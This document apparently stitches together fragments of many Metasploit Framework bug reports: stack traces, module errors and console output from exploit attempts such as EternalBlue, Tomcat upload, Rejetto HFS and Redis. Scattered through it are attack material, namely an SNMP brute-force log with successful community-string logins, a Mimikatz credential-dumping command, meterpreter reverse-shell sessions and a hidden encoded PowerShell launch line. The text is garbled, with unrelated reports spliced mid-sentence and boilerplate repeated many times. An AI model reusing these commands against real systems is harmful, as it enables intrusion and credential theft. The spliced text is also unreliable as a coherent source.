/opt/metasploit-framework/embedded/framework/plugins/wmap.rb:150:in `cmd_wmap_sites'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:158:in `run'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:23:in `<main>'
it returns error retrieving table prefix
the exploit fails while trying to encode the payload:
[-] 127.0.0.1:445 - exploit failed: windows/meterpreter/reverse_tcp: all encoders failed to encode.
[*] exploit completed, but no session was created.
two commands are being executed:
`sekurlsa::logonpasswords` is being executed first
`full` is being executed next (and is erroring)
~100 lines like the following
[+] [2020.09.08-11:58:13] 10.150.150.2:161 - login successful: secret (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:13] 10.150.150.2:161 - login successful: scotty (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: ilmi (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: ibm (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: cr52401 (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: sanfran (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: san-fran (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:14] 10.150.150.2:161 - login successful: rwa (access level: read-only); proof (sysdescr.0): [+] [2020.09.08-11:58:15] 10.150.150.2:161 - login successful: rw (access level: read-only); proof (sysdescr.0): ``` and a polluted database.
i received the error **rubysmb::error::communicationerror: read timeout expired when reading from the socket (timeout=30)**
## system stuff
services in both workspaces are returned: ```
======== host port proto name state info
---- ---- ----- ---- ----- ----
127.0.0.1 1234 tcp default_service open 127.0.0.2 1234 tcp test_service open
doesn't run the exploit.
*] started reverse tcp handler on myip:8888 [*] ip - meterpreter session 1 closed
reason: died
[*] meterpreter session 1 opened (myip:8888 -> ip:49257) at 2020-09-09 10:38:53 -0400
the following error is reported:
could not find bcrypt-3.1.15 in any of the sources
run `bundle install` to install missing gems.
this is the error i do get:
stdapi_fs_ls: operation failed: 1
the smb version scan crashes with the following message:
nomethoderror undefined method `filter!' for [1, 2, 3]:array
``` ## system stuff
it gives an error of 'download failed'
this download method worked days ago before i updated to msf6 you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
i can execute shell_to_meterpreter but with output like this =
[-] shells on the target platform, , cannot be upgraded to meterpreter at this time you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces
nothing weirdo in there ## system stuff
i cant load it with "failed to load module:exploit/windows/smb/ms17_010_eternalblue_win8" output i check my framework.og and it show like this
## system stuff
the connection dies you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
kali linux 2020.3 intel i3 6006u
metasploit gets installed in the root directory of `m:\\` ## system stuff
shell_to_meterpreter module failed and sessions output say it is a bsd not a win you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
checked the handler on from google chrome browser and my certificate was untrusted as i got a promt asking me if i really want to visit the website.
immediately got shut down as windows defender detects the meterpreter connection
## system stuff i am using kali linux 2017.3 downloaded directly from the official kali linux website.
it gets stuck waiting for deletion of the xxxxxxxx.php file uploaded in order to exploit the system
i then solved the challenge doing my own plugin with a reverse shell, so i think that the problems is not about the target system but occurs because the script get stuck waiting and can't call a well-made meterpreter session
## system stuff linux 5.7.0-kali1-amd64 x86_64 virtual machine on virtualbox
50 gb of memory
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
i received the error **rubysmb::error::communicationerror: read timeout expired when reading from the socket (timeout=30)**
## system stuff
internal error from get_service
[08/17/2020 07:48:56] [i(0)] core: http post request: /api/v1/events failed with code: 500 message: <h1>internal server error</h1>
[08/17/2020 07:48:56] [e(0)] core: exploit failed (multi/http/tomcat_mgr_upload): nomethoderror undefined method `get_service' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? get_msf_version - nomethoderror undefined method `get_service' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? get_msf_version
[08/17/2020 07:48:56] [i(0)] core: http get request: /api/v1/workspaces?name=default failed with code: 500 message: <h1>internal server error</h1>
[08/17/2020 07:48:56] [e(0)] core: problem finding workspace - json::parsererror 784: unexpected token at '<h1>internal server error</h1>'
[08/17/2020 07:48:56] [e(0)] core: exploit failed (multi/http/tomcat_mgr_upload) - json::parsererror 784: unexpected token at '<h1>internal server error</h1>'
``` ## system stuff
no sessions are found you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces nothing useful ## system stuff
android 7.0 phone, amd a9-9410 radeon r5 running linux
> use rex client (smb1 only) to enumerate directories, since it is not compatible with rubysmb client
> exploit failed [no-access]: rex::proto::smb::exceptions::loginerror login failed: undefined method `[]' for nil:nilclass ## system stuff
``` 3: from /opt/metasploit-framework/embedded/framework/lib/rex/proto/smb/simpleclient.rb:232:in `delete' 2: from /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/ruby_smb-2.0.2/lib/ruby_smb/client/utils.rb:55:in `delete' 1: from /opt/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/ruby_smb-2.0.2/lib/ruby_smb/smb1/file.rb:193:in `delete'
rubysmb::error::invalidpacket (expecting smb1 protocol with command=50, got smb1 protocol with command=50)
``` ## system stuff
the malicious request is cannot be send: ```
[*] started reverse tcp handler on 192.168.1.105:4444 [*] using url:
[*] local ip:
[*] server started.
[*] sending a malicious request to /
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: uri.escape is obsolete
/usr/share/metasploit-framework/modules/exploits/windows/http/rejetto_hfs_exec.rb:110: warning: uri.escape is obsolete
[*] server stopped.
[!] this exploit may require manual cleanup of '%temp%\\jsywngueznxzf.vbs' on the target
[*] exploit completed, but no session was created.
``` ## system stuff
however, the module instead printed, 'version of weblogic is not vulnerable.' ## system stuff
user is presented with a stack trace pointing to a call for `workspace.id` because `workspace` is nil, there is no `id` method ## system stuff
we instead get the current user as `no-user` instead of the name of the actual user who we have gotten the shell as
## system stuff
msfconsole does not run ## system stuff
data is not imported from the xml into the msf webservice db
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
attempting to start msf web service...failed
[!] msf web service appears to be started, but may not operate as expected
fails looking for .pem file
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
here is the log:
[08/01/2020 19:29:05] [e(0)] meterpreter: error running command mic_start: nomethoderror undefined method `[]' for #<rex::post::meterpreter::tlv: >
[08/01/2020 19:29:05] [d(0)] meterpreter: call stack:
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/packet.rb:533:in `block in add_tlvs'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/packet.rb:453:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/packet.rb:453:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/packet.rb:532:in `add_tlvs'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/channel.rb:111:in `create'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/stdapi/mic/mic.rb:46:in `mic_start'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/stdapi/mic.rb:130:in `cmd_mic_start'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:153:in `run'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/interactive.rb:51:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/core.rb:1446:in `cmd_sessions'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:158:in `run'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:23:in `<main>'
``` ## system stuff
[-] sniffer_interfaces: operation failed: incorrect function
the log shows:
[07/31/2020 19:50:38] [e(0)] meterpreter: sniffer_interfaces: operation failed: incorrect function.
[07/31/2020 19:50:38] [d(0)] meterpreter: call stack:
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/extensions/sniffer/sniffer.rb:38:in `interfaces'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/sniffer.rb:56:in `cmd_sniffer_interfaces'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:153:in `run'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:66:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/base/sessions/meterpreter.rb:583:in `_interact'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/interactive.rb:51:in `interact'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/core.rb:1446:in `cmd_sessions'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/msf/ui/console/command_dispatcher/exploit.rb:211:in `cmd_exploit'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/shell.rb:158:in `run'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/console.rb:48:in `start'
/opt/metasploit-framework/embedded/framework/lib/metasploit/framework/command/base.rb:82:in `start'
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:23:in `<main>'
``` ## system stuff
"[*] exploit completed, but no session was created" and/or the target machine crashes.
![image]( why is this happening? i always get zero sized files.
it fails on the decryption step ## system stuff
the command generated an invalid 148682 byte file (around double the expected size, `73802*2`) with extra characters that break the pe format exe : <img width="1466" alt="image" src=" "> for example the mz header is invalid, it\'s wide with extra null bytes added ## system stuff
no session is created, stage crashes
## system stuff msf host machine:
* metasploit v5.0.98-dev-0d58014b7dcffe1ecd7c8b5ad6b87116af80ae08
* macos 10.15.5 target machine:
* windows server 2016 datacenter x64 version 1607 (os build 14393.3750)
* windows defender disabled, including realtime protections
msf5 post(multi/recon/local_exploit_suggester) > run [*] 10.13.1.160 - collecting local exploits for x86/linux...
[*] 10.13.1.160 - 35 exploit checks are being tried...
[-] 10.13.1.160 - post failed: msf::exploit::failed bash not found
[-] 10.13.1.160 - call stack:
[-] 10.13.1.160 - /usr/share/metasploit-framework/lib/msf/core/exploit.rb:1445:in `fail_with'
[-] 10.13.1.160 - /usr/share/metasploit-framework/modules/exploits/linux/local/exim4_deliver_message_priv_esc.rb:178:in `check_for_bash'
[-] 10.13.1.160 - /usr/share/metasploit-framework/modules/exploits/linux/local/exim4_deliver_message_priv_esc.rb:204:in `check'
[-] 10.13.1.160 - /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:121:in `block in run'
[-] 10.13.1.160 - /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `each'
[-] 10.13.1.160 - /usr/share/metasploit-framework/modules/post/multi/recon/local_exploit_suggester.rb:119:in `run'
[*] post module execution completed
msf5 post(multi/recon/local_exploit_suggester) > ```
## system stuff
debian (kali) 5.6.14
all users are reported as login failed
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces
i deleted the framework.log and i run again the test
[07/10/2020 12:54:36] [e(0)] core: dependency for windows/encrypted_shell_reverse_tcp is not supported
[07/10/2020 12:54:36] [e(0)] core: dependency for windows/x64/encrypted_shell_reverse_tcp is not supported
[07/10/2020 12:54:36] [e(0)] core: dependency for windows/x64/encrypted_reverse_tcp is not supported
[07/10/2020 12:54:36] [e(0)] core: dependency for windows/encrypted_reverse_tcp is not supported ## system stuff
the exploit doesn't load and shows the following error: ```[-] failed to load module: exploit/windows/smb/ms17_010_eternalblue_win8``` ![image]( here's tail of `~/.msf4/logs/framework.log` (probably the exploit is broken)
[07/08/2020 13:25:40] [e(0)] core: unable to load module /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.py, unknown module type
[07/08/2020 13:28:26] [e(0)] core: /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb failed to load - errno::enoent no such file or directory @ rb_sysopen - /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb
[07/08/2020 13:28:26] [e(0)] core: unexpected output running /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.py:
traceback (most recent call last): file "/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.py", line 178, in <module> ntfea9000 = (pack(\'<bbh\', 0, 0, 0) + \'\\x00\')* # with these fea, ntfea size is
typeerror: can't concat str to bytes [07/08/2020 13:28:26] [e(0)] core: unable to load module /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.py, unknown module type
``` ## system stuff
it can't use this token for authentication you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
getting error already mentioned
/opt/metasploit-framework/bin/../embedded/framework/msfconsole:23:in `<main>'
[06/27/2020 16:23:56] [e(0)] meterpreter: error running command wlan_geolocate: nomethoderror undefined method `[]' for nil:nilclass
[06/27/2020 16:23:56] [d(0)] meterpreter: call stack:
/opt/metasploit-framework/embedded/framework/lib/rex/google/geolocation.rb:43:in `fetch!'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/android.rb:611:in `cmd_wlan_geolocate'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:105:in `run_command'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/opt/metasploit-framework/embedded/framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/opt/metasploit-framework/embedded/framework/lib/rex/post/meterpreter/ui/console.rb:68:in `block in interact'
does everything like expected until.
[*] 192.168.2.19:445 - sending all but last fragment of exploit packet
[-] 192.168.2.19:445 - rubysmb::error::communicationerror: read timeout expired when reading from the socket (timeout=30)
[*] exploit completed, but no session was created
~/.msf4/logs/framework.log : ## system stuff
nothing happens
## system stuff
metasploit is throwing a stack trace and not killing the job
## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
no http requests ## system stuff
x86/unicode_upper failed with an encoding exception occurred.
error: an encoding exception occurred,
## system stuff
auxiliary failed: nomethoderror undefined method `>=' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/message.rb:49:in `read'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:71:in `block in initialize'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:70:in `loop'
[-] /usr/share/metasploit-framework/lib/postgres/postgres-pr/connection.rb:70:in `initialize'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/postgres.rb:44:in `new'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/postgres.rb:44:in `attempt_login'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:231:in `block in scan!'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:154:in `block in each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:157:in `block (3 levels) in each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:155:in `each_line'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:155:in `block (2 levels) in each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:143:in `each_line'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:143:in `block in each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:142:in `open'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/credential_collection.rb:142:in `each'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:141:in `each_credential'
[-] /usr/share/metasploit-framework/lib/metasploit/framework/login_scanner/base.rb:205:in `scan!'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/postgres/postgres_login.rb:78:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:117:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces ## system stuff
for *calc.exe*, payload.encoded on windows is:
powershell -w hidden -nop -e ywbtagqalgblahgazqagac8aywagahmadabhahiadaagagmayqbsagmalgblahgazqa=
``` on the linux target, the behaviour is the same
for example for a command "echo hi", payload.encoded is:
/bin/echo -ne \\\\\\\\\\\\x65\\\\\\\\\\\\x63\\\\\\\\\\\\x68\\\\\\\\\\\\x6f\\\\\\\\\\\\x20\\\\\\\\\\\\x68\\\\\\\\\\\\x69|sh
``` ## system stuff
it appears based on the error message that an ascii regex is being used, preventing the search command from being able to match any unicode results
therefore if unicode characters are provided as input, it will error out
refer to the earlier listing for the specific error output
## system stuff
the module loading fails because the redis exploit module (custom and meterpreter) requires executable stack (`-z execstack`)
on debian 10, the `redis` server log contains the following error after trying to load the module : `478:s 26 mar 2020 10:56:58.383 # module ./ranyc.so failed to load: ./ranyc.so: cannot enable executable stack as shared object requires: operation not permitted` if we remove `-z execstack`, from the `data/exploits/redis/exp/makefile` file, the module will load without issue ( and the `shell.exec` redis command will work
## system stuff
you might also want to check the last ~1k lines of
`/opt/metasploit/apps/pro/engine/config/logs/framework.log` or
`~/.msf4/logs/framework.log` for relevant stack traces > c:/metasploit-framework/embedded/lib/ruby/gems/2.6.0/gems/rex-core-0.1.13/lib/rex/compat.rb:376: warning: win32api is deprecated after ruby 1.9.1; use fiddle directly instead
> > [-] warning! the following modules could not be loaded!
> [-] c:/metasploit-framework/embedded/framework/modules/payloads/singles/cmd/unix/reverse_ssh.rb
> [-] please see c:/users/<redacted>/.msf4/logs/framework.log for details
looking into [framework.log]() reveals: > [03/22/2020 17:33:31] [e(0)] core: c:/metasploit-framework/embedded/framework/modules/payloads/singles/cmd/unix/reverse_ssh.rb failed to load due to the following error: loaderror cannot load such file -- pty this error is known, and affects other software, written in ruby, when run on windows os platform.
the fix there (commit was to use `popen4` instead of `pty`, perhaps this can do the same ## system stuff
[*] 10.11.1.241:5040 - binding to 1a927394-352e-4553-ae3f-7cf4aafca620:1.0@ncacn_ip_tcp:10.11.1.241[5040] ...
[-] 10.11.1.241:5040 - auxiliary failed: rex::proto::dcerpc::exceptions::invalidpacket invalid packet
dcerpc response packet is incomplete
[-] 10.11.1.241:5040 - call stack:
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/rex/proto/dcerpc/response.rb:30:in `initialize'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/rex/proto/dcerpc/client.rb:227:in `new'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/rex/proto/dcerpc/client.rb:227:in `bind'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/rex/proto/dcerpc/client.rb:48:in `initialize'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/modules/auxiliary/scanner/dcerpc/windows_deployment_services.rb:81:in `new'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/modules/auxiliary/scanner/dcerpc/windows_deployment_services.rb:81:in `query_host'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/modules/auxiliary/scanner/dcerpc/windows_deployment_services.rb:53:in `run_host'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:117:in `block (2 levels) in run'
[-] 10.11.1.241:5040 - /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn' ## system stuff
ips are not listed
[-] auxiliary failed: rex::proto::dcerpc::exceptions::fault dcerpc fault => nca_op_rng_error
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/proto/dcerpc/client.rb:278:in `call'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:118:in `is_vulnerable?'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:227:in `block in check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:210:in `each'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:210:in `check_host'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/smb/smb_uninit_cred.rb:255:in `run_host'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:117:in `block (2 levels) in run'
[-] /usr/share/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn' ## system stuff
ips are not included in the results of the scan
resource (lab/master.rc)> use auxiliary/scanner/smb/pipe_dcerpc_auditor
resource (lab/master.rc)> run
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: the server refused our netbios session request
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: connection reset by peer
login failed: the server responded with error: status_access_denied (command=115 wordcount=0)
login failed: the server responded with error: status_access_denied (command=115 wordcount=0)
login failed: the server responded with error: status_access_denied (command=115 wordcount=0)
login failed: the server responded with error: status_access_denied (command=115 wordcount=0)
uuid 0d72a7d4-6148-11d1-b4aa-00c04fb66ea0 1.0 open via browser
uuid 17fdd703-1827-4e34-79d4-24a55c53bb37 1.0 open via browser
uuid 300f3532-38cc-11d0-a3f0-0020af6b0add 1.2 open via browser
[*] scanned 15 of 24 hosts (62% complete)
uuid 367abb81-9844-35f1-ad32-98f038001003 2.0 open via browser
uuid 3ba0ffc0-93fc-11d0-a4ec-00a0c9062910 1.0 open via browser
uuid 4b324fc8-1670-01d3-1278-5a47bf6ee188 3.0 open via browser
uuid 65a93890-fab9-43a3-b2a5-1e330ac28f11 2.0 open via browser
[*] scanned 23 of 24 hosts (95% complete)
uuid 6bffd098-a112-3610-9833-012892020162 0.0 open via browser
uuid 6bffd098-a112-3610-9833-46c3f87e345a 1.0 open via browser
uuid 82273fdc-e32a-18c3-3f78-827929dc23ea 0.0 open via browser
uuid 8d0ffe72-d252-11d0-bf8f-00c04fd9126b 1.0 open via browser
uuid 8d9f4e40-a03d-11ce-8f69-08003e30051b 1.0 open via browser
uuid 93149ca2-973b-11d1-8c39-00c04fb984f9 0.0 open via browser
uuid afa8bd80-7d8a-11c9-bef4-08002b102989 1.0 open via browser
uuid c9378ff1-16f7-11d0-a0b2-00aa0061426a 1.0 open via browser
[*] scanned 24 of 24 hosts (100% complete) ## system stuff
[-] error while running command hosts: undefined method `find_host_tags' for #<msf::dbmanager: >
did you mean? add_host_tag call stack:
/usr/share/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:335:in `find_host_tags'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:557:in `block (3 levels) in cmd_hosts'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:549:in `map'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:549:in `block (2 levels) in cmd_hosts'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activerecord-4.2.11.1/lib/active_record/relation/delegation.rb:46:in `each'
/usr/share/metasploit-framework/vendor/bundle/ruby/2.5.0/gems/activerecord-4.2.11.1/lib/active_record/relation/delegation.rb:46:in `each'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:547:in `block in cmd_hosts'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:2125:in `block in each_host_range_chunk'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:2106:in `each'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:2106:in `each_host_range_chunk'
/usr/share/metasploit-framework/lib/msf/ui/console/command_dispatcher/db.rb:544:in `cmd_hosts'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/share/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/share/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/usr/share/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/share/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
/usr/bin/msfconsole:49:in `<main>' ## system stuff
msf5 exploit(linux/redis/redis_unauth_exec) > check
